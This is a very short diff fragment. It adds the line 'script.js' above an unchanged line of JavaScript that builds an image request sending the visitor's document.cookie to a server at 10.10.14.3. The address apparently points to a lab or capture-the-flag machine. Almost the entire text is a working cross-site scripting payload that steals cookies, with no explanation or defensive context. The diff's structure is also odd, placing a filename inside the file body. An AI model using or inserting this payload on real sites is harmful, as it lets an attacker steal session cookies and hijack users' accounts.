@@ -1,3 +1,4 @@
+script.js
 new Image().src='http://10.10.14.3/index.php?c='+document.cookie
 
 
